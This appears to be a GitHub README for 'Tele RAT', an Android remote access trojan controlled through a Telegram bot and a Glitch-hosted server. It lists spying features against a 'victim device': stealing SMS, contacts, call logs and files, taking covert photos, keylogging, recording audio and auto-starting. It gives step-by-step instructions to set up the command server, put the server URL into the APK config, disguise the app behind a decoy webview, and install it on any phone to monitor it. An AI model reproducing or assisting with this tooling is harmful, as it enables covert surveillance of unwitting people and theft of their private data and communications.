[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/TeamDarkAnon)

[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com)

#                     TELE RAT

A multifunctional Telegram based Android RAT  without port forwarding.
## Features

 - Read all the files of Internal Storage
 - Delete files or folder from victim device
 - Download Any Media to your Device from Victims Device
 - Get system information of Victim Device
 - Retrieve the List of Installed Applications
 - Retrive SMS
 - Retrive Call Logs
 - Retrive Contacts
 - Click photos from victim device front/main camera
 - Send SMS
 - Keylogger {not working in android 11 or higher version}
- Record Audio
- Pre Binded with [Instagram Webview]
 - Runs In Background 
    - Auto Starts on restarting the device
    
 - No port forwarding needed

## Requirements
 - Glitch Account
 - [ApkEasy Tool](https://apk-easy-tool.en.lo4d.com/windows) ( For PC ) or 
[ApkTool Editor](https://999xprofit.com/dogs/apkeditor.apk) ( for Android)


## How to use
- Search  BotFather on Telegram
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379420-85ccb51d-d442-4753-aa7d-3520e00cfcbf.jpg)
- Creat a bot with any name/username
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379494-f1f0897a-8dc8-4822-a20e-810bede3fe97.jpg)
- Copy your Bot token
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379566-8eef82d6-a43a-43b3-9606-426eb9360469.jpg)
- Go to glitch.com click
- new project then glitch-hello-node
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379635-e64a5afa-b61a-469f-a66c-c346e545a4a8.jpg)
- Delete all pre-available files {clcik on 3 dots}
- click on files and upload package.json, server.js
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379742-766f978f-2b3d-4248-a111-e02dfca5e790.jpg)
- Paste your bot token in line 16 {beetwen ''}
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379872-e6541fe6-6e8a-4c31-af39-f6272c24ca58.jpg)
- Paste your chat id in line 15 
- (search userinfobot on telegram and send any msg you will
- get your chatid
![App Screenshot](https://user-images.githubusercontent.com/109063269/180379956-fd117f4a-2248-4cbf-98b2-19049cf0228f.jpg)
- click on previvew availble on bottom
- open in new window
![App Screenshot](https://user-images.githubusercontent.com/109063269/180380033-0dbf2cbe-e91d-479d-9aa7-fd81f52bbf76.jpg)
- if you see this type then copy url and close all tabs
![App Screenshot](https://user-images.githubusercontent.com/109063269/180380126-802c0c64-af8c-4e5f-9f90-6b944574c8e9.jpg)
- now open Apkeditor select apk 
- go to following directory
![App Screenshot](https://user-images.githubusercontent.com/109063269/180380210-52feb153-3dff-4d7c-95bf-e8e6359000d8.jpg)
![App Screenshot](https://user-images.githubusercontent.com/109063269/180380344-ca9a68df-8fdb-4ec3-a65c-36ebc84fa774.jpg)
- paste your glitch url 
```bash
  { 
  "host": "https://https://xxxx.glitch.me/", 
  "socket": "wss://xxxx.glitch.me/", 
  "webView": "https://google.com/" 
}
```
- note: In webview you can add any website 
- when victim will open apk given website will be open in apk
- must replace https to wss
- click on save, and go back
![App Screenshot](https://user-images.githubusercontent.com/109063269/180380418-e0451a90-d60d-42b5-b998-9ef53e8653e5.jpg)
- clcik on smail and wait 3/4 second
- Now build the apk
- and install in any phone
![App Screenshot](https://user-images.githubusercontent.com/109063269/180380470-7a1b5652-02ed-444b-95d9-aa2d0f6fc4b5.jpg)
- now go to BotFather clcik on your botusername
 - start your bot 
 - now you can monitor all device who will install the apk

### ❤️Thank you Supporters❤️
[![Stargazers repo roster for @TeamDarkAnon/Tele-Rat](https://reporoster.com/stars/dark/TeamDarkAnon/Tele-Rat)](https://github.com/TeamDarkAnon/Tele-Rat/stargazers)
## 🔗 CONTACT
[![instagram](https://img.shields.io/badge/CONTACT-TELEGRAM-blue)](https://t.me/TeamDarkAnon)

[![instagram](https://img.shields.io/badge/CONTACT-INSTAGRAM-red)](https://instagram.com)


## Disclaimer

Devolper Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.
Dogerat is built for both Educational and Internal use ONLY.
- Make sure the Telegram username is @TeamDarkAnon beware from scam



## ALCOHOL SUPPORT 
!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)
- Bitcoin
- 1LeLwYyDHu51875aenZaNcEnMrEbHwEKJd
- Usdt trc20
- TWX456AoupoYKwCYUKk3ZMWJtNJZRRHnrp
